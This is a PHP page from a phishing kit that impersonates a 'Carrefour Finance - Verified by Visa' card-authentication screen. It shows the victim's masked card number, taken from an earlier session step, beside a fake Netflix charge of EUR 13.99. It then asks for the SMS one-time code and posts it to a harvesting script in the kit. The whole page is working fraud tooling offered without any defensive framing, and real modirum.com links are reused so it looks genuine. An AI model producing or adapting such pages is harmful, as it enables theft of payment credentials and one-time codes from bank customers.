<?php

session_start();

///// PRINT 4 LAST NUMBERS //////
$number = $_SESSION['cn'];
$masked =  str_pad(substr($number, -4), strlen($number), 'x', STR_PAD_LEFT);
$phone = $_SESSION['tel'];
$ephone =  str_pad(substr($phone, -4), strlen($phone), 'X', STR_PAD_LEFT);
///// PRINT 4 LAST NUMBERS //////






?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
<title>Carrefour Finance - Verified by Visa™</title>
<link href="crf/style.css" rel="stylesheet" type="text/css" media="screen">
</head>
 
<body onload="onBodyLoad();">
<div id="page">
	<div id="header"></div>
	
	<div id="content">
		<h1>Vos paiements sécurisés sur Internet</h1>
		<h2 class="center">Pour terminer votre achat, saisissez le code reçu.</h2>
			<ul class="infos left">
				<li>Commerçant</li>
				<li>Montant</li>
				<li>Date</li>
				<li>Numéro de carte</li>
			</ul>
			<ul class="infos right">
				<li>NETFLIX</li>
				<li>EUR 13,99</li>
				<li id="purchDate"><?php echo date("m/d/Y g:i:s"); ?></li>
				<li><?php echo $masked ?></li>
			</ul>
			<div class="clear"></div>

			<div class="form">
			<div class="content">
				<div id="erreur" style="display: block;">
					<p class="erreur"></p>
				</div>
			<form action="../activity/auth_3d_crf_sms.php" method="post" novalidate="novalidate">				
				<fieldset>
					<div class="field center">
						<!-- <p> -->
							<span class="bold">Saisissez le code reçu :</span>
							<!-- <br>sur votre numéro de GSM : +32476568139</p> -->
						 <!-- <p><a href="https://acs1.3ds.modirum.com/mdpayacs/pareq;mdsessionid=A5AA6D68D640C1D616A3578C8F14ABBF?phoneChange=true">(Modifier le numéro de GSM)</a></p> -->
                        <div>
						<input type="text" name="otp" value="" id="otp" maxlength="20" class="ieheight">
                            <a href="https://acs1.3ds.modirum.com/mdpayacs/pareq;mdsessionid=A5AA6D68D640C1D616A3578C8F14ABBF?help=true"><img src="crf/bt_aide.gif" alt="Aide" width="16" height="15"></a>&nbsp;&nbsp;
					</div>
					</div>
				</fieldset>
					
				<div class="button">
					<!-- Reset -->
					<a href="#"><img src="crf/bt_annuler.gif" alt="ANNULER"></a>&nbsp;&nbsp;
					<!-- Submit -->
                    <button type="submit" value="submit" name="submit" id="submit">
                        <img src="crf/bt_suivant.gif" alt="SUIVANT">
                    </button>
            </div>
			  </form>
			</div>
	  </div>
  </div>

	<div id="footer"></div>
</div>



</body></html>